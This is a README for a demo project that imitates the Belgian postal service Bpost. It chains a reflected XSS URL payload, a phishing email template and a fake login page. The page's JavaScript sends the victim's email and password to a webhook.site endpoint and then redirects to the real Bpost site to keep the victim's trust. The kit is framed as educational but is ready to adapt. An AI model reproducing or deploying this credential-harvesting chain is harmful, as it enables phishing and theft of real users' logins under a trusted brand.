
# XSS Bpost Demo 🚨

This project demonstrates a realistic Reflected XSS (Cross-Site Scripting) attack in a simulated delivery tracking scenario, mimicking the Belgian postal service Bpost. It includes a phishing login page, a fake email, and a redirection to the real Bpost site after credential capture.

---

## 📁 Project Structure

```
xss-bpost-demo/
│
├── index.html           # Main vulnerable tracking page (XSS injection via `trackid` parameter)
├── fake-login.html      # Fake login page (captures credentials and sends them to webhook)
├── fake-email.html      # Phishing email page (HTML standalone preview)
└── README.md            # This documentation file
```

---

## 🎯 Objective

Demonstrate a full XSS chain including:

1. **Reflected XSS** injection via URL parameter.
2. Auto-redirection to a **fake login page**.
3. Capture of **user credentials** to a webhook (e.g. webhook.site).
4. Redirection to the **official Bpost website** to maintain user trust.

---

## 🧪 Reflected XSS Injection

Open in browser (local server must be running):

```
http://localhost:8000/index.html?trackid=<script>window.location.href='fake-login.html'</script>
```

This injects a script that redirects the user to the phishing login page.

---

## 🕵️‍♀️ Fake Login Page

`fake-login.html` contains a simple login form that:

- Accepts `email` and `password`
- Sends credentials to a webhook endpoint (e.g., [Webhook.site](https://webhook.site))
- Redirects the user to the real Bpost site (`https://track.bpost.cloud/btr/web/#/search`) after login

The script used in `fake-login.html`:

```javascript
const form = document.querySelector("form");
form.addEventListener("submit", (e) => {
    e.preventDefault();
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    fetch("[https://webhook.site/your-custom-ur](https://webhook.site/b729d597-59d8-44da-948a-383d7d9a90bb)l", {
        method: "POST",
        body: JSON.stringify({ email, password }),
        headers: { "Content-Type": "application/json" }
    }).then(() => {
        window.location.href = "https://track.bpost.cloud/btr/web/#/search";
    });
});
```

> Replace the webhook URL with your own unique one from webhook.site.

---

## ✉️ Fake Email Template

`fake-email.html` simulates a phishing email stating:

- The delivery failed
- The user must click a button to reschedule

Button link leads to the vulnerable `index.html` page with XSS payload injected.

---

## 📸 Screenshots

- Fake email preview (HTML)
- Phishing login interface (mimics Bpost)
- Webhook request showing credentials captured
- Optional: Chrome DevTools with injected URL

---

## ⚠️ Legal Disclaimer

Made by Jessica (2025)
This project is for educational and ethical hacking demonstrations **only**.
Do not deploy this code against real services or users. Always have authorization.

---

Made by Jessica (2025)
